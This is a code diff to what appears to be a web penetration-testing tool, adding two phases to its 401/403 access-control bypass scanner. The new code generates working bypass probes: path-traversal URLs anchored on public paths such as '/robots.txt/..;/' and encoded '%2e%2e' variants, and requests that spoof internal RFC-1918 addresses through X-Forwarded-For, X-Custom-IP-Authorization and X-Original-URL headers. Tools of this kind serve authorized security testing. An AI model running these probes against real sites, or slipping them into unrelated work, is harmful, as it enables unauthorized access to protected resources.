@@ -3,7 +3,7 @@ bypass_tab.py  –  Bypass Tab
 ==============================
 Two modes:
   • WAF Bypass            — evade WAF rules blocking payloads (12 phases)
-  • Access Control Bypass — bypass 401/403/405 access controls (11 phases)
+  • Access Control Bypass — bypass 401/403/405 access controls (13 phases)
 
 New layout (horizontal split):
   ┌──────────────────────────┬──────────────────────────────────────┐
@@ -1620,6 +1620,26 @@ _IP_SPOOF_HEADERS = [
     "X-Host","X-Forwarded-Host","X-Custom-IP-Authorization","Forwarded",
     "X-Azure-ClientIP","X-Akamai-Remote-Addr",
 ]
+# Internal RFC-1918 ranges — used in Phase 13 (last, may be slow)
+_INTERNAL_IPS = [
+    "192.168.1.1", "192.168.1.100", "192.168.1.254",
+    "192.168.0.1", "192.168.0.100",
+    "10.0.0.1",   "10.0.0.100",  "10.0.1.1",
+    "172.16.0.1", "172.16.1.1",  "172.31.0.1",
+    "10.10.10.10",
+]
+# Known valid/public paths to use as bypass anchors in Phase 12
+_VALID_PATH_ANCHORS = [
+    "/robots.txt",
+    "/favicon.ico",
+    "/assets/",
+    "/static/",
+    "/images/",
+    "/css/",
+    "/js/",
+    "/public/",
+]
+
 _REWRITE_HEADERS = [
     ("X-Original-URL","/{path}"),("X-Rewrite-URL","/{path}"),
     ("X-Override-URL","/{path}"),("Referer","/{path}"),
@@ -1709,7 +1729,7 @@ def _path_mutations(path: str) -> List[Dict]:
     return v
 
 class BypassScanMixin:
-    """403/401/405 access-control bypass — 11 phases, ~300 probes."""
+    """403/401/405 access-control bypass — 13 phases, ~400 probes."""
 
     def scan_bypass(self) -> Dict[str, Any]:
         rd      = self.request_data
@@ -1739,7 +1759,7 @@ class BypassScanMixin:
         findings: List[Dict] = []
         stats = {"phases_run":0,"payloads_sent":0,"bypasses_found":0}
 
-        self.scan_progress.emit(f"🛡  [Bypass] Starting 403/401 access-control bypass — {url[:80]}")
+        self.scan_progress.emit(f"🛡  [Bypass] Starting 403/401 access-control bypass (13 phases) — {url[:80]}")
 
         b_status, b_len, b_time = self._bypass_baseline(url, method, hdrs, body, timeout)
         stats["phases_run"] += 1; stats["payloads_sent"] += 1
@@ -1984,6 +2004,86 @@ class BypassScanMixin:
                 ("combo path..;/",   f"{path}..;/"),
                 ("combo path%00",    f"{path}%00"),
               ]])
+
+        # ── Phase 12 — Valid-path prefix bypass ──────────────────────────
+        # Use a known-valid path as a "trusted" prefix, then traverse to the
+        # blocked resource.  e.g. /robots.txt/..;/admin/  → server may allow
+        # it because the prefix resolves to a public path first.
+        p12 = []
+        for anchor in _VALID_PATH_ANCHORS:
+            # Determine suffix separator: files (no trailing /) need no extra /
+            anchor_no_slash = anchor.rstrip("/")
+            anchor_is_file  = not anchor.endswith("/")
+
+            # Pattern A: /anchor/..;/blocked_path/
+            p12.append({
+                "url":     origin + anchor_no_slash + "/..;" + path + "/",
+                "method":  method, "headers": hdrs, "body": body,
+                "technique": f"prefix {anchor}/..;{path}/",
+            })
+            # Pattern B: /anchor/../blocked_path
+            p12.append({
+                "url":     origin + anchor_no_slash + "/../" + clean_path,
+                "method":  method, "headers": hdrs, "body": body,
+                "technique": f"prefix {anchor}/../{clean_path}",
+            })
+            # Pattern C: /anchor../blocked_path/ (dot after anchor, no slash)
+            p12.append({
+                "url":     origin + anchor_no_slash + ".." + path + "/",
+                "method":  method, "headers": hdrs, "body": body,
+                "technique": f"prefix {anchor}..{path}/",
+            })
+            # Pattern D: /anchor..;/blocked_path/
+            p12.append({
+                "url":     origin + anchor_no_slash + "..;" + path + "/",
+                "method":  method, "headers": hdrs, "body": body,
+                "technique": f"prefix {anchor}..;{path}/",
+            })
+            # Pattern E: /anchor/%2e%2e/blocked_path (URL-encoded dots)
+            p12.append({
+                "url":     origin + anchor_no_slash + "/%2e%2e/" + clean_path,
+                "method":  method, "headers": hdrs, "body": body,
+                "technique": f"prefix {anchor}/%2e%2e/{clean_path}",
+            })
+            # Pattern F: /anchor/%2e%2e;/blocked_path/
+            p12.append({
+                "url":     origin + anchor_no_slash + "/%2e%2e;/" + clean_path + "/",
+                "method":  method, "headers": hdrs, "body": body,
+                "technique": f"prefix {anchor}/%2e%2e;/{clean_path}/",
+            })
+        _run(12, "Valid-path Prefix Bypass (/robots.txt/..;/path/)", p12)
+
+        # ── Phase 13 — Internal-IP Spoofing (RFC-1918, all headers) ──────
+        # Tries every IP-spoof header with private-network IPs in addition
+        # to localhost.  Kept last because the matrix is large.
+        p13 = []
+        for h in _IP_SPOOF_HEADERS:
+            for ip in _INTERNAL_IPS:
+                p13.append({
+                    "url": url, "method": method, "body": body,
+                    "headers": _merge_headers(hdrs, {h: ip}),
+                    "technique": f"internal-IP {h}: {ip}",
+                })
+        # Also try multi-hop XFF chains with internal IPs
+        for ip in _INTERNAL_IPS[:5]:
+            chain = f"127.0.0.1, {ip}, 10.0.0.1"
+            p13.append({
+                "url": url, "method": method, "body": body,
+                "headers": _merge_headers(hdrs, {"X-Forwarded-For": chain}),
+                "technique": f"XFF chain: {chain}",
+            })
+        # Combine internal IP with X-Original-URL rewrite (stacked)
+        for ip in _INTERNAL_IPS[:4]:
+            p13.append({
+                "url": url, "method": method, "body": body,
+                "headers": _merge_headers(hdrs, {
+                    "X-Forwarded-For": ip,
+                    "X-Custom-IP-Authorization": ip,
+                    "X-Original-URL": "/" + clean_path,
+                }),
+                "technique": f"internal-IP stacked {ip} + X-Original-URL",
+            })
+        _run(13, "Internal-IP Range Spoofing (RFC-1918, all headers)", p13)
 
         seen: set = set(); deduped = []
         for f in findings:
